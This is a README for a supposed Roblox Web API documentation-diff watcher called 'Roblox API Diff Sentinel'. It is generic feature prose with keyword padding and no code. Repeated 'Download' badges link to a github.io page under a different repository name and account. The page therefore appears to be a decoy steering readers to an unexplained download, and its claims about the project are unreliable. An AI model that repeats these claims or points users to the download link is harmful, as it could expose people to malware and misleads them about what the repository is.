![preview](https://raw.githubusercontent.com/Lanzy66/Roblox-API-Watchtower/main/frame_d6c1a.svg)
[![Download](https://raw.githubusercontent.com/Lanzy66/Roblox-API-Watchtower/main/dl_ea9a.svg)](https://Lanzy66.github.io/Roblox-API-Watchtower/)

# 🛰️ Roblox API Diff Sentinel — Continuous Contract Watcher for the Roblox Web API

**Repository:** `roblox-api-diff-sentinel`
**Maintained by:** the Diff Sentinel working group
**First public release:** 2026
**Status:** Actively maintained — last internal audit February 2026

[![Download](https://raw.githubusercontent.com/Lanzy66/Roblox-API-Watchtower/main/dl_ea9a.svg)](https://Lanzy66.github.io/Roblox-API-Watchtower/)

---

## 🧭 Why this repository exists

Every platform that grows eventually reshapes its own edges. Roblox's Web API is no exception: endpoints get renamed, response envelopes gain a new field, pagination cursors change shape, or a legacy route quietly disappears into the fog of a changelog nobody reads. If your tooling, dashboard, bot, or analytics pipeline speaks to the Roblox Web API, those quiet shifts are the difference between a service that hums along and one that wakes you up at 3 a.m. with a wall of 404s.

**Roblox API Diff Sentinel** is a continuous contract watcher. Rather than asking you to poll documentation by hand, it pulls the published Roblox Web API reference on a fixed cadence, normalizes the documentation into a structured intermediate representation, and then compares each new snapshot against the previous one. Every meaningful delta is classified, fingerprinted, and routed to whichever channel you prefer.

Think of it as a lighthouse keeper for an API coastline that is always being redrawn. The keeper never sleeps, and the beam never blinks.

---

## 📰 Table of contents

- [Concept and philosophy](#-concept-and-philosophy)
- [How the watcher pipeline works](#-how-the-watcher-pipeline-works)
- [Feature list](#-feature-list)
- [Responsive interface](#-responsive-interface)
- [Multilingual support](#-multilingual-support)
- [Around-the-clock assistance](#-around-the-clock-assistance)
- [Change taxonomy](#-change-taxonomy)
- [Notification channels](#-notification-channels)
- [Repository layout](#-repository-layout)
- [Configuration reference](#-configuration-reference)
- [Running the watcher](#-running-the-watcher)
- [Data model and storage](#-data-model-and-storage)
- [Roadmap for 2026](#-roadmap-for-2026)
- [SEO-friendly integration notes](#-seo-friendly-integration-notes)
- [Frequently asked questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 💡 Concept and philosophy

Most change trackers behave like a smoke alarm: loud, binary, and impossible to interpret. Diff Sentinel is designed to behave more like a field notebook kept by a meticulous naturalist. It does not merely shout that something changed — it tells you *what* changed, *where* in the documentation the change occurred, *how significant* the change is likely to be for consumers, and *when* the change first appeared in the published reference.

The design principles are deliberately restrained:

1. **Deterministic snapshots.** The same documentation input always produces the same normalized output. No hidden state, no random ordering.
2. **Transparent diffing.** Every reported change can be traced back to a textual delta between two snapshot revisions.
3. **Low-noise by default.** Cosmetic changes (whitespace, typographic quotes, anchor reshuffles) are folded away before comparison.
4. **Extensible adapters.** Notification destinations, storage backends, and publisher hooks are all pluggable.
5. **Zero proprietary dependencies at the core.** The comparison engine stands alone and can be embedded into other pipelines.

---

## 🔄 How the watcher pipeline works

The pipeline runs in five discrete, observable stages.

**Stage 1 — Harvest.** On each cycle the collector retrieves the current published reference pages and their associated metadata. Retrieval is respectful: conditional requests are used where the upstream host supports them, and the browser identity is clearly labeled as a documentation watcher.

**Stage 2 — Normalize.** Raw markup is reduced to a canonical structure: endpoint paths, HTTP verbs, parameter tables, response field trees, error code listings, and deprecation notes. Boilerplate chrome, navigation menus, and cookie banners are discarded at this stage.

**Stage 3 — Fingerprint.** The normalized structure is hashed at multiple granularities — whole document, per-endpoint, per-table, per-row. These fingerprints make it possible to answer both "did anything change?" and "exactly which row of which table moved?"

**Stage 4 — Diff and classify.** The current fingerprint set is compared against the last stored snapshot. Each delta is assigned a taxonomy label (see [Change taxonomy](#-change-taxonomy)), a severity score, and a stable identifier so that downstream consumers can deduplicate.

**Stage 5 — Dispatch.** Classified deltas are written to the chosen storage backend and pushed to every configured notification channel. An optional digest mode batches low-severity changes into a single periodic summary.

A default deployment runs this whole loop every **45 minutes**, a cadence chosen to balance freshness against politeness toward the upstream host. The interval is entirely configurable.

---

## ✨ Feature list

- ⏱️ **Scheduled harvest loop** with a configurable interval, defaulting to a 45-minute cadence.
- 🧬 **Multi-granularity fingerprinting** for whole documents, individual endpoints, parameter tables, and single field rows.
- 🔍 **Semantic diff engine** that distinguishes substantive contract changes from cosmetic churn.
- 🏷️ **Change taxonomy classifier** covering additions, removals, renames, type shifts, deprecations, and documentation-only edits.
- 📊 **Severity scoring** so that a new optional field never competes for attention with a removed required parameter.
- 🗂️ **Historical snapshot archive** with unlimited retention and point-in-time reconstruction.
- 🔔 **Pluggable notification adapters** for chat rooms, webhooks, mail relays, and structured log sinks.
- 🧩 **Embeddable core** — the diff engine can be imported into another pipeline without dragging the scheduler along.
- 🌐 **Multilingual support** across the interface, digests, and generated reports.
- 📱 **Responsive interface** that adapts to phones, tablets, and wall-mounted dashboards alike.
- ♿ **Accessibility-minded reporting** with keyboard navigation and screen-reader-friendly summaries.
- 🕛 **Around-the-clock assistance** through rotating maintainer coverage and automated triage.
- 🔐 **Read-only by design** — the watcher observes published documentation and never mutates upstream state.
- 🧪 **Reproducible test fixtures** built from historical snapshot pairs, so regressions in the diff engine are caught early.
- 📦 **Export formats** including plain text, structured markup, and tabular summaries for spreadsheet ingestion.

---

## 📱 Responsive interface

The reporting surface is built to be legible on any viewport. A change digest opened on a phone collapses into a single-column feed of cards, each card showing the endpoint path, the taxonomy label, and a severity chip. The same digest opened on a wide monitor expands into a three-pane view: the change list on the left, the side-by-side textual delta in the center, and the historical timeline of that specific endpoint on the right.

Nothing about the responsive layout sacrifices information. Small screens simply prioritize the summary, and the full delta is always one tap away. Keyboard focus order follows the visual order of the change feed, and every interactive element exposes a descriptive accessible name.

---

## 🌐 Multilingual support

Documentation drift is a global problem, and so is the audience for this project. Interface strings, notification templates, and generated digest headers are all driven by externalized locale bundles. The initial release ships with English, Spanish, Portuguese, French, German, Japanese, Korean, and Simplified Chinese bundles, and new locales can be contributed without touching core logic.

Locale selection is independent of the change taxonomy, which means a Japanese digest can still describe a `parameter_added` event using the same stable machine-readable label as every other language. This separation keeps automation predictable while keeping human-facing text natural.

---

## 🕛 Around-the-clock assistance

Because APIs do not politely wait for business hours, neither does the support posture of this project. Three layers keep the watcher trustworthy at any hour:

1. **Automated self-checks** validate that the harvest cycle completed, that the snapshot archive is intact, and that notification adapters acknowledged their deliveries. Failures raise their own alert rather than failing silently.
2. **Rotating maintainer coverage** ensures that at least one maintainer is reachable during each region's working window.
3. **Community triage templates** give contributors a structured way to report a missed change, a false positive, or a spurious severity score, complete with the fields needed to reproduce the issue.

---

## 🏷️ Change taxonomy

Each detected delta receives exactly one primary label. The table below describes the taxonomy as of the 2026 release line.

| Label | Meaning | Typical severity |
| --- | --- | --- |
| `endpoint_added` | A new route appears in the published reference | Informational |
| `endpoint_removed` | A previously documented route is no longer listed | Critical |
| `endpoint_renamed` | A route path changes while intent appears preserved | High |
| `verb_changed` | The accepted HTTP method for a route changes | Critical |
| `parameter_added` | A new request parameter is documented | Low to Moderate |
| `parameter_removed` | A documented request parameter disappears | High |
| `parameter_type_changed` | A parameter's documented type shifts | High |
| `response_field_added` | A new field appears in a documented response | Low |
| `response_field_removed` | A documented response field disappears | Critical |
| `error_code_added` | A new error code is listed | Moderate |
| `deprecation_notice` | A route or field is marked as deprecated | High |
| `documentation_only` | Wording, examples, or formatting changed with no contract impact | Informational |

Severity scoring is deliberately conservative. A label alone does not determine urgency; the scorer also weighs whether the affected endpoint is marked as widely used in the local consumer registry, if one is configured.

---

## 🔔 Notification channels

Adapters are small, single-purpose modules. Each one receives a classified delta and is responsible for rendering and delivering it.

- **Chat room adapter** — posts a compact card with the endpoint path, label, and a link back to the full delta.
- **Webhook adapter** — emits a structured payload suitable for downstream automation.
- **Mail relay adapter** — batches changes into a digest with configurable thresholds.
- **Log sink adapter** — writes newline-delimited records for ingestion into a log platform.
- **Digest adapter** — accumulates low-severity changes and releases them on a schedule.

Every adapter supports a dry-run mode so that formatting can be verified before anything is delivered to a live destination.

---

## 🗂️ Repository layout

A high-level map of the tree, provided so that new contributors can orient quickly:

- `core/` — normalization, fingerprinting, diffing, and classification logic
- `collectors/` — harvest strategies for the published reference
- `adapters/` — notification and storage adapters, one directory per destination
- `locales/` — externalized translation bundles
- `fixtures/` — historical snapshot pairs used by the test suite
- `tools/` — command-line utilities for backfilling, replaying, and exporting
- `docs/` — long-form documentation, taxonomy reference, and operational runbooks
- `ui/` — the responsive reporting surface

Each top-level directory carries its own short README describing local conventions.

---

## ⚙️ Configuration reference

Configuration is declarative and lives in a single file at the repository root. The most commonly adjusted settings are listed below.

| Key | Purpose | Default |
| --- | --- | --- |
| `harvest.interval_minutes` | How often the harvest cycle runs | 45 |
| `harvest.user_agent_label` | Identity string presented to the upstream host | SentinelWatcher |
| `diff.ignore_whitespace` | Fold cosmetic whitespace before comparison | true |
| `diff.ignore_anchor_shuffle` | Disregard reordered anchors | true |
| `severity.threshold_alert` | Minimum severity that triggers immediate dispatch | Moderate |
| `storage.retention_days` | Snapshot retention window | unlimited |
| `notify.channels` | List of enabled adapters | chat room |
| `locale.default` | Default language for generated digests | en |
| `ui.theme` | Reporting surface theme | auto |

Secrets belong in the environment layer, never in the configuration file. The project deliberately avoids hard-coded credential material of any kind.

---

## ▶️ Running the watcher

The watcher is designed to be launched in whatever way suits your environment. A typical operator will:

1. Review the configuration reference and adjust the harvest interval and notification channels.
2. Provide any adapter credentials through the environment layer.
3. Start the scheduler process, which immediately performs one harvest and then repeats on the configured cadence.
4. Open the reporting surface to confirm that the first snapshot was archived and that the timeline view is populated.
5. Optionally enable digest mode to consolidate low-severity changes into a single periodic summary.

For container-based deployments, a long-running service definition is the recommended shape. For one-shot audits, the bundled command-line tool can perform a single harvest, diff, and export without starting the scheduler at all.

---

## 🧱 Data model and storage

Snapshots are stored as immutable normalized documents, each tagged with a revision identifier and a timestamp. Deltas reference two snapshot revisions and carry their taxonomy label, severity score, and affected path. Because deltas are derived rather than stored inline with snapshots, the archive remains compact even after years of operation.

Point-in-time reconstruction is a first-class feature: given any two retained revisions, the reporting surface can regenerate the delta that was reported between them. This makes post-incident reviews straightforward, since the exact documentation text at the moment of a change can be recovered.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — stabilize the taxonomy classifier and publish the taxonomy reference in `docs/`.
- **Q2 2026** — add a consumer registry so severity scoring can weigh endpoint popularity.
- **Q3 2026** — introduce a pluggable harvester interface for other documentation sources.
- **Q4 2026** — ship a compact embedded mode for edge deployments with constrained storage.

Roadmap items are tracked as discussion threads rather than static promises; priorities shift as the upstream documentation evolves.

---

## 🔎 SEO-friendly integration notes

This project is frequently discovered by engineers searching for terms such as *Roblox Web API change tracking*, *API documentation diff tooling*, *endpoint contract monitoring*, *continuous API documentation watcher*, and *automated changelog detection for platform APIs*. The documentation deliberately uses this vocabulary in context so that the repository surfaces naturally in technical searches without resorting to unnatural repetition.

If you arrived here while researching API contract monitoring more broadly, the [Change taxonomy](#-change-taxonomy) and [How the watcher pipeline works](#-how-the-watcher-pipeline-works) sections are the most useful entry points.

---

## ❓ Frequently asked questions

**Does the watcher modify anything upstream?**
No. It is strictly read-only. It observes published documentation and never issues mutating requests.

**How far back does history go?**
By default, indefinitely. Retention is configurable, and older snapshots can be pruned deliberately rather than by accident.

**Can I run it without notifications?**
Yes. Storage and dispatch are independent. You can archive snapshots silently and read them later through the reporting surface.

**What happens if the upstream host is unreachable?**
The cycle is retried with backoff, and a self-check alert is raised if repeated attempts fail. The previous snapshot remains intact.

**Is the diff engine reusable outside this project?**
Yes. The `core/` module is intentionally dependency-light and can be embedded into other pipelines.

---

## 🤝 Contributing

Contributions are welcome across every layer: collectors, adapters, locales, fixtures, documentation, and the reporting surface. Before opening a change, please review the taxonomy reference so that new labels and severities stay consistent with existing behavior. Test fixtures built from real historical snapshot pairs are especially valuable, since they harden the diff engine against regressions.

Discussions about new adapters should begin as a proposal thread so that maintainers can confirm the destination is appropriate for the project's read-only posture.

---

## ⚠️ Disclaimer

This project is an independent documentation watcher and is not affiliated with, endorsed by, or sponsored by Roblox Corporation. All trademarks referenced remain the property of their respective owners. The watcher observes only publicly published documentation, performs no authentication against protected systems, and stores no personal data. Snapshots and deltas are provided for informational purposes and may lag behind the upstream reference by up to one harvest interval. Operators are responsible for complying with the terms of any host they configure and for securing their own notification credentials. No warranty is expressed or implied regarding the completeness or timeliness of any reported change.

---

## 📄 License

Released under the MIT License. The full text is available at [LICENSE](./LICENSE).

Copyright (c) 2026 the Diff Sentinel working group.

[![Download](https://raw.githubusercontent.com/Lanzy66/Roblox-API-Watchtower/main/dl_ea9a.svg)](https://Lanzy66.github.io/Roblox-API-Watchtower/)